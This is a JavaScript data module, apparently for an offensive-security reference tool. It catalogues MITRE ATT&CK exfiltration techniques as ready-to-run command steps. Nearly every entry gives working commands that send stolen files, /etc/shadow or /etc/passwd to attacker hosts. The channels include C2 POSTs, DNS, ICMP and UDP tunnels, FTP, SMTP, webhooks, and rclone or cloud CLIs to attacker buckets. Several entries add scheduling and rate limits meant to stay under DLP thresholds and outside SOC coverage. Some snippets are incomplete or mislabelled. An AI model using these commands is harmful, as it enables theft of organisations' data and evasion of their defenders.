export const EXFILTRATION = {
  id: "exfiltration",
  name: "Exfiltration",
  tacticId: "TA0010",
  subtitle: "Exfil over C2 • DNS Tunneling • ICMP • FTP • SMTP • Web Services • S3 • Dropbox • GDrive • Encrypted Non-C2 Protocol • HTTPS POST • Steganography • Physical Media • Bluetooth • Non-App Layer Protocol • Scheduled Transfer • rclone • Automated",
  color: "#34d399",
  techniques: [
    {
      name: "Exfiltration Over C2 Channel",
      id: "T1041",
      summary: "Beacon upload • Cobalt Strike download • C2 channel exfil",
      description: "Exfiltrate data through the existing C2 communication channel",
      tags: ["C2 exfil", "beacon upload", "Cobalt Strike", "T1041"],
      steps: [
        "Cobalt Strike file download (exfil):\n# Beacon command:\n> download C:\\Users\\admin\\Documents\\confidential.xlsx\n> download C:\\Windows\\NTDS\\ntds.dit\n# File transferred through C2 HTTPS channel\n# Chunked transfer blends with normal C2 traffic",
        "Metasploit download:\n> meterpreter > download C:\\\\Users\\\\admin\\\\secret.docx /tmp/\n> meterpreter > download -r C:\\\\Users\\\\admin\\\\Documents /tmp/loot/\n# Recursive directory download through Meterpreter channel",
        "Manual C2 exfil via PowerShell:\n> $bytes = [System.IO.File]::ReadAllBytes('C:\\secret.xlsx')\n> $b64 = [Convert]::ToBase64String($bytes)\n> Invoke-WebRequest -Uri 'https://c2.attacker.com/upload' -Method POST -Body $b64\n# Upload file via POST to C2",
        "Chunk large files:\n> $data = [System.IO.File]::ReadAllBytes($file)\n> $chunkSize = 100000\n> for ($i = 0; $i -lt $data.Length; $i += $chunkSize) {\n>     $chunk = $data[$i..([Math]::Min($i+$chunkSize-1,$data.Length-1))]\n>     Invoke-WebRequest -Uri \"https://c2.attacker.com/chunk/$i\" -Method POST -Body ([Convert]::ToBase64String($chunk))\n> }\n# Avoid triggering large upload thresholds",
        "Exfil timing to avoid detection:\n# Exfil during business hours (blends with normal traffic)\n# Rate limit: stay under DLP thresholds (e.g., < 10MB/hour)\n# Avoid weekends/nights if traffic baseline shows no uploads\n# Spread exfil over multiple days"
      ]
    },
    {
      name: "Exfiltration Over Alternative Protocol",
      id: "T1048",
      summary: "DNS tunneling • ICMP • FTP • email • SMB exfil",
      description: "Exfiltrate data over protocols less likely to be monitored or have content inspection",
      tags: ["DNS tunneling", "ICMP", "FTP exfil", "T1048"],
      steps: [
        "DNS tunneling exfiltration:\n$ iodined -f -c -P password 10.0.0.1 tunnel.attacker.com  # Server\n$ iodine -f -P password tunnel.attacker.com  # Client\n# iodine: https://code.kryo.se/iodine/ — Creates IP-over-DNS tunnel\n# All traffic through DNS queries - works when only DNS is allowed\n$ cat secret.txt | base64 | while read line; do host \"$line.exfil.attacker.com\"; done",
        "ICMP tunneling:\n# ptunnel-ng: https://github.com/lnslbrty/ptunnel-ng\n$ ptunnel-ng -r 127.0.0.1 -R 22  # Server on target\n$ ptunnel-ng -p attacker.com -lp 2222 -da 127.0.0.1 -dp 22  # Client\n$ ssh -p 2222 localhost  # SSH over ICMP tunnel\n# Works when only ICMP is allowed (some restrictive networks)",
        "FTP exfiltration:\n$ ftp -n attacker.com <<EOF\n> user attacker password\n> binary\n> put /tmp/loot.zip\n> bye\n> EOF\n# Passive FTP through firewall\n$ lftp -c 'open -u user,pass ftp://attacker.com; put /tmp/loot.zip'",
        "SMTP email exfiltration:\n$ python3 -c \"\nimport smtplib\nfrom email.mime.base import MIMEBase\nfrom email import encoders\nimport base64\nwith open('/tmp/loot.zip','rb') as f:\n    data = base64.b64encode(f.read()).decode()\nserver = smtplib.SMTP('mail.attacker.com',587)\nserver.sendmail('noreply@target.com','attacker@attacker.com','From: noreply@target.com\\nSubject: Report\\n\\n'+data)\n\"\n# Email data exfil as base64 attachment",
        "SMB exfiltration:\n$ copy C:\\Users\\admin\\secret.xlsx \\\\attacker.com\\uploads\\\n$ net use \\\\attacker.com\\uploads /user:attacker password\n# SMB to external host (ports 445 or 139)\n# Often blocked at perimeter - test first"
      ]
    },
    {
      name: "Exfiltration Over Web Service",
      id: "T1567",
      summary: "S3 upload • Dropbox • OneDrive • Google Drive • Pastebin",
      description: "Exfiltrate data through legitimate web services that are trusted and hard to block",
      tags: ["S3 upload", "Dropbox", "Google Drive", "T1567"],
      steps: [
        "AWS S3 exfiltration:\n$ aws s3 cp /tmp/loot.zip s3://attacker-bucket/loot.zip\n$ aws s3 sync /tmp/collected/ s3://attacker-staging/target-org/\n# If AWS credentials compromised or SSRF: attacker reads from S3 bucket\n# Exfil from victim environment to attacker-controlled S3",
        "Dropbox exfiltration via API:\n$ curl 'https://content.dropboxapi.com/2/files/upload' \\\n  -H 'Authorization: Bearer DROPBOX_TOKEN' \\\n  -H 'Dropbox-API-Arg: {\"path\":\"/loot.zip\",\"mode\":\"add\"}' \\\n  -H 'Content-Type: application/octet-stream' \\\n  --data-binary @/tmp/loot.zip",
        "Google Drive exfiltration via API:\n$ curl -H 'Authorization: Bearer ACCESS_TOKEN' \\\n  -F 'metadata={\"name\":\"loot.zip\"};type=application/json;charset=UTF-8' \\\n  -F 'file=@/tmp/loot.zip;type=application/zip' \\\n  'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart'",
        "Paste site exfiltration (small data):\n$ curl -s -X POST https://pastebin.com/api/api_post.php -d 'api_dev_key=KEY&api_option=paste&api_paste_code='$(base64 /tmp/small_file.txt)\n# Pastes up to 10MB per paste (free)\n# Good for config files, creds, small documents",
        "Exfil via webhook (Slack, Teams, Discord):\n$ curl -X POST 'https://hooks.slack.com/services/HOOK_URL' -H 'Content-type: application/json' -d '{\"text\":\"'$(cat /etc/passwd | head | base64)'\"}'\n# Webhook can exfil data in message payload\n# Webhooks to corporate Slack/Teams often trusted"
      ]
    },
    {
      name: "Exfiltration Over Physical Medium",
      id: "T1052",
      summary: "USB exfil • removable media • bluetooth • air-gap crossing",
      description: "Exfiltrate data to physical media devices including USB drives",
      tags: ["USB exfil", "removable media", "air-gap", "T1052"],
      steps: [
        "USB exfiltration:\n$ robocopy C:\\Users\\admin\\Documents E:\\ *.docx *.xlsx *.pdf /s\n$ xcopy /s /e /y C:\\Users\\admin\\Desktop E:\\Desktop\\\n# Copy to mounted USB drive letter\n# Removable media: DLP may block or alert on USB activity",
        "Air-gap data exfiltration:\n# Physical air-gap: data must leave on physical media\n# Stuxnet used USB to cross air-gap\n# Modern: AirHopper (radio), Fankfurter (heat), MOSQUITO (speakers)\n# Practical: obtain physical access, copy to USB, physically remove",
        "Covert air-gap channels:\n# Acoustic: ultrasonic data transmission via speakers/mics\n# RF: TEMPEST, transmit data via EM emissions from monitor/CPU\n# Optical: LED/camera-based transmission\n# Thermal: temperature modulation via CPU load\n# These are nation-state techniques for air-gapped networks",
        "Bluetooth exfiltration:\n$ hcitool scan  # Find Bluetooth devices\n$ sdptool browse BD_ADDR  # Browse Bluetooth services\n# OBEX file push over Bluetooth\n$ ussp-push --to BD_ADDR loot.zip\n# Range: ~100m (class 1) to 10m (class 2)",
        "Printer / fax exfiltration:\n# Print sensitive documents to physical printer\n# Physical retrieval required\n# Fax: dial external number, transmit document data\n# Old technique - still works if organization has fax machines\n# Bypasses many DLP solutions"
      ]
    },
    {
      name: "Automated Exfiltration",
      id: "T1020",
      summary: "Auto-collect scripts • timed exfil • trigger-based • ransomware-style",
      description: "Automate the collection and exfiltration process to operate without operator involvement",
      tags: ["automated", "scripts", "scheduled exfil", "T1020"],
      steps: [
        "Automated file collection and upload:\n> # PowerShell automated exfil script\n> $keywords = @('password','secret','confidential','invoice','contract')\n> $targets = Get-ChildItem -Path C:\\Users -Recurse -Include '*.docx','*.xlsx','*.pdf' -ErrorAction SilentlyContinue\n> foreach ($file in $targets) {\n>     foreach ($kw in $keywords) {\n>         if ((Select-String -Path $file -Pattern $kw -Quiet)) {\n>             # Upload to C2\n>             Invoke-RestMethod -Uri 'https://c2.attacker.com/upload' -Method POST -InFile $file\n>             break\n>         }\n>     }\n> }",
        "Schedule exfil with cron/schtasks:\n$ echo '0 2 * * * /tmp/exfil.sh' | crontab -\n# Exfil at 2am daily\n$ schtasks /create /tn 'Update' /tr 'powershell -ep bypass -file C:\\temp\\exfil.ps1' /sc daily /st 02:00 /f\n# Scheduled task for off-hours exfil\n# Off-hours exfil avoids DLP during business hours (traffic lower)",
        "Trigger-based exfil:\n> // Exfil only when specific conditions met\n> if (DateTime.Now.Hour >= 22 || DateTime.Now.Hour <= 6) {\n>     // Off-hours exfil\n>     Exfiltrate();\n> }\n> // Or: exfil only on user logoff\n> // Or: exfil only when VPN not connected",
        "Ransomware-style data exfil + encrypt:\n# Step 1: Automate collection of all valuable files\n# Step 2: Upload to attacker infrastructure\n# Step 3: Encrypt files on victim systems\n# Double extortion: 'Pay or we publish your data'\n$ rclone copy /data remote:bucket --config rclone.conf\n$ openssl enc -aes-256-cbc -k PASSPHRASE -in file.xlsx -out file.xlsx.enc",
        "Size-based exfil throttling:\n> // Avoid triggering DLP by limiting upload size/rate\n> private static readonly long MAX_BYTES_PER_HOUR = 50 * 1024 * 1024;  // 50MB\n> private static long bytesThisHour = 0;\n> // Check limit before each upload\n> if (bytesThisHour + fileSize < MAX_BYTES_PER_HOUR) { Upload(file); }\n# Stay under DLP thresholds"
      ]
    },
    {
      name: "Transfer Data to Cloud Account",
      id: "T1537",
      summary: "Cloud sync • rclone • cloud account takeover • S3 sync • GCP bucket",
      description: "Transfer collected data to cloud storage controlled by the adversary",
      tags: ["rclone", "S3 sync", "cloud storage", "T1537"],
      steps: [
        "rclone for multi-cloud exfil:\n$ rclone config  # Configure attacker's cloud storage\n$ rclone copy /tmp/loot/ gdrive:Exfil/ --progress\n$ rclone sync /etc/ s3:attacker-bucket/etc/ -v\n$ rclone copy /home/ sftp:attacker.com:/loot/ --max-age 30d\n# rclone supports: S3, GDrive, Dropbox, OneDrive, FTP, SFTP, Box, Mega",
        "AWS CLI to attacker S3:\n$ aws configure set aws_access_key_id ATTACKER_KEY\n$ aws configure set aws_secret_access_key ATTACKER_SECRET\n$ aws s3 sync /tmp/loot s3://attacker-staging-bucket/ --region us-east-1\n# Direct S3 upload from compromised system to attacker AWS account",
        "Azure Storage upload:\n$ az storage blob upload-batch --source /tmp/loot --destination container --connection-string 'ATTACKER_CONNECTION_STRING'\n$ azcopy copy '/tmp/loot/*' 'https://attackerstorage.blob.core.windows.net/container/SAS_TOKEN' --recursive\n# Upload from victim to attacker Azure storage",
        "Google Cloud Storage:\n$ gcloud auth activate-service-account --key-file attacker-sa.json\n$ gsutil cp -r /tmp/loot gs://attacker-bucket/loot/\n# GCS upload with attacker service account credentials",
        "MEGA cloud storage:\n$ megaput --username attacker@mail.com --password pass /tmp/loot.zip\n# megaput: part of MEGAcmd — https://github.com/meganz/MEGAcmd\n# Or via rclone: rclone copy /tmp/loot mega:backup/\n# MEGA provides 50GB free, end-to-end encrypted — traffic to mega.nz"
      ]
    },
    {
      name: "Exfiltration Over Bluetooth",
      id: "T1011",
      summary: "Bluetooth data transfer • BLE exfil • OBEX file push • proximity exfil",
      description: "Exfiltrate data via Bluetooth connections to bypass network-based DLP controls",
      tags: ["Bluetooth", "BLE", "OBEX", "proximity exfil", "T1011"],
      steps: [
        "Bluetooth device discovery:\n$ hcitool scan\n$ bluetoothctl scan on\n# Discover nearby Bluetooth devices\n# Identify: phones, laptops, IoT devices",
        "OBEX file push (FTP over Bluetooth):\n$ ussp-push --to TARGET_BD_ADDR /tmp/loot.zip loot.zip\n$ python3 obexftp.py --bdaddr TARGET_BD_ADDR --channel 9 --put /tmp/loot.zip\n# Transfer files via Bluetooth OBEX protocol",
        "Bluetooth Low Energy (BLE) exfiltration:\n$ gatttool -b TARGET_BD_ADDR -I\n> connect\n> primary\n> char-write-req HANDLE VALUE\n# Write data to BLE characteristic on target device",
        "Bluetooth PAN (Personal Area Network):\n$ bluetooth-agent 0000 &\n$ bluez-simple-agent hci0 TARGET_BD_ADDR\n$ pand --connect TARGET_BD_ADDR --role PANU\n# Create Bluetooth network for data transfer",
        "Air-gap crossing via Bluetooth:\n# Air-gapped system with Bluetooth radio\n# Attacker device physically near target\n# Range: 10m (class 2) to 100m (class 1)\n# Practical for targeted physical proximity attacks"
      ]
    },
    {
      name: "Non-Application Layer Protocol Exfil",
      id: "T1095",
      summary: "Raw socket • ICMP exfil • TCP covert channel • UDP exfil",
      description: "Exfiltrate data using non-application layer protocols that bypass application-aware DLP",
      tags: ["ICMP exfil", "raw socket", "covert channel", "T1095"],
      steps: [
        "ICMP data exfiltration:\n# icmpexfil: https://github.com/martinoj2009/ICMPExfil\n$ python3 icmpexfil.py -s /etc/shadow attacker.com\n# Or manual: encode file data in ICMP echo request payload\n$ python3 -c \"\nimport socket, struct, base64\ndata = base64.b64encode(open('/etc/shadow','rb').read())\nfor i in range(0,len(data),32):\n    s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)\n    s.sendto(struct.pack('bbHHh',8,0,0,0,0)+data[i:i+32], ('attacker.com',0))\n\"",
        "Custom TCP covert channel:\n> // Encode data in TCP sequence/acknowledgment numbers\n> // Or in TCP options fields\n> // 4 bytes per packet via sequence number\n# Extremely covert: looks like valid TCP SYN packets",
        "UDP exfiltration on unusual ports:\n$ python3 -c \"\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nimport base64\ndata = base64.b64encode(open('/etc/passwd','rb').read())\nfor i in range(0,len(data),500): s.sendto(data[i:i+500], ('attacker.com',53))\n\"\n# Use UDP port 53 to carry arbitrary data through DNS-allowed egress",
        "IP header covert channel:\n> // Encode data in IP options field\n> // Or in TTL field (multiple packets)\n> // Or in fragmentation offset\n# Very low bandwidth but extremely difficult to detect",
        "SCTP covert channel:\n# Stream Control Transmission Protocol\n# Less common than TCP/UDP - may bypass monitoring\n# Requires scapy for raw SCTP:\n$ python3 -c 'from scapy.all import *; send(IP(dst=\\\"attacker.com\\\")/SCTP()/SCTPChunkData(data=open(\\\"loot.b64\\\",\\\"rb\\\").read()))'"
      ]
    },
    {
      name: "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
      id: "T1048.002",
      summary: "HTTPS to non-C2 • SMTPS • LDAPS exfil • encrypted protocol abuse",
      description: "Exfiltrate data over encrypted protocols that are not the primary C2 channel to evade detection",
      tags: ["HTTPS exfil", "SMTPS", "encrypted protocol", "T1048"],
      steps: [
        "HTTPS POST exfiltration to legitimate service:\n$ curl -s -X POST 'https://httpbin.org/post' --data-binary @/tmp/loot.b64\n$ curl -s -X POST 'https://webhook.site/UNIQUE_ID' --data-urlencode \"data=$(base64 /etc/shadow)\"\n# httpbin, webhook.site, requestbin — legitimate testing services\n# Hard to block without false positives",
        "SMTP/SMTPS email exfiltration:\n$ python3 exfil_email.py\nimport smtplib, base64\nfrom email.mime.base import MIMEBase\nwith smtplib.SMTP_SSL('smtp.gmail.com', 465) as s:\n    s.login('attacker@gmail.com', 'app_password')\n    msg.attach(MIMEBase('application', 'octet-stream'))\n    s.send_message(msg)\n# Send collected data as email attachment\n# SMTPS traffic on 465 encrypted and common",
        "WebDAV exfiltration:\n$ curl -T /tmp/loot.zip https://attacker-webdav.com/uploads/\n$ cadaver https://attacker.com/webdav/ <<EOF\nput /tmp/loot.zip\nEOF\n# WebDAV over HTTPS: common corporate sharing protocol\n# Hard to distinguish from legitimate file sync",
        "SFTP/SCP exfiltration:\n$ scp /tmp/loot.tar.gz attacker@jump.attacker.com:/tmp/\n$ sftp attacker@attacker.com <<EOF\nput /tmp/collected_data.zip /uploads/\nEOF\n# SFTP on port 22: usually allowed outbound\n# Encrypted: content not visible to IDS without key",
        "Exfil via cloud sync client:\n$ rclone copy /tmp/loot/ googledrive:Exfil/ --bwlimit 1M\n# Rate-limited: 1MB/s — stays below DLP thresholds\n$ rclone copy /tmp/loot/ onedrive:Backup/ --transfers 1 --checkers 1\n# OneDrive: common in corporate environments, usually whitelisted\n# rclone supports 40+ cloud providers — hard to block all"
      ]
    },
    {
      name: "Exfiltration via Steganography",
      id: "T1027.003",
      summary: "Steganography in images • audio steganography • PDF embedding • covert channels",
      description: "Hide exfiltrated data within innocent-looking files like images and documents",
      tags: ["steganography", "image encoding", "covert channel", "T1027"],
      steps: [
        "Embed data in JPEG image with steghide:\n$ steghide embed -cf innocent.jpg -ef /tmp/loot.zip -p 'passphrase'\n# Data hidden in image DCT coefficients\n# innocent.jpg: looks identical to original\n$ steghide extract -sf innocent.jpg -p 'passphrase'\n# Extract on attacker side",
        "LSB steganography in PNG:\n$ python3 stegano.py lsb hide --input original.png --file loot.zip --output hidden.png\n# Least Significant Bit: change last bit of each pixel color\n# Imperceptible to human eye\n$ python3 stegano.py lsb reveal --input hidden.png > loot.zip",
        "Exfil data in DNS query labels:\n$ python3 dns_steg.py --data $(base64 /etc/passwd | tr -d '\\n') --domain exfil.attacker.com\n# Encode data in DNS query names: ENCODED.exfil.attacker.com\n# Capture on DNS server side: tcpdump -i eth0 port 53 -w dns.pcap",
        "Hide data in image EXIF metadata:\n$ exiftool -Comment=\"$(base64 /tmp/small_file.txt)\" output.jpg\n$ exiftool -UserComment=\"$(cat /etc/passwd | base64)\" photo.jpg\n# EXIF data survives most basic image processing\n# Extracts trivially: exiftool photo.jpg | grep UserComment",
        "Covert channel via timing:\n# Encode data in network packet timing (inter-packet delays)\n# Bit 1 = long delay, bit 0 = short delay\n# Extremely slow but leaves no data in packets\n# Nation-state technique for air-gap crossing"
      ]
    },
    {
      name: "Scheduled Transfer",
      id: "T1029",
      summary: "Time-based exfil • bandwidth limit • off-hours • rate limit",
      description: "Schedule data exfiltration to occur at specific times to avoid detection",
      tags: ["scheduled", "off-hours", "bandwidth limit", "T1029"],
      steps: [
        "Time-delayed exfiltration script:\n$ at 2:00 AM tomorrow /c 'powershell -ep bypass -file C:\\exfil.ps1'\n$ crontab -e\n> 0 2 * * * /tmp/exfil.sh >> /tmp/exfil.log 2>&1\n# Execute during off-hours when fewer analysts monitoring\n# 2-4 AM local time = lowest SOC coverage",
        "Rate-limited exfil to avoid thresholds:\n> $files = Get-ChildItem /tmp/loot\n> $bytesPerHour = 20MB\n> $totalSent = 0\n> $startTime = Get-Date\n> foreach ($f in $files) {\n>     while ($totalSent -ge $bytesPerHour) {\n>         Start-Sleep 60\n>         if ((Get-Date) -gt $startTime.AddHours(1)) { $totalSent = 0; $startTime = Get-Date }\n>     }\n>     Upload-File $f.FullName\n>     $totalSent += $f.Length\n> }",
        "Opportunistic exfil (when conditions are met):\n> // Only exfil when on specific network (office WiFi)\n> var adapters = NetworkInterface.GetAllNetworkInterfaces();\n> bool atOffice = adapters.Any(a => a.Name.Contains('Corporate'));\n> if (atOffice) StartExfiltration();\n# Or: exfil only when not connected to VPN (less monitored)\n# Or: exfil only during lunch hours",
        "DNS-based scheduled exfil:\n> // Exfil 1 record per minute via DNS TXT\n> var data = ReadNextChunk(512);  // 512 bytes per DNS record\n> var encoded = Convert.ToBase64String(data);\n> Dns.GetHostAddresses(encoded + '.exfil.attacker.com');\n> Thread.Sleep(60000);\n# 512 bytes/minute = ~720KB/day via DNS queries\n# Extremely slow but undetectable",
        "Business-hours camouflage:\n> var now = DateTime.Now;\n> if (now.DayOfWeek == DayOfWeek.Saturday || now.DayOfWeek == DayOfWeek.Sunday) return;\n> if (now.Hour < 9 || now.Hour >= 17) return;\n> // Exfil only during 9-5 business hours\n# Blends with normal data uploads during work hours\n# Analysts expect traffic during business hours"
      ]
    }
  ]
};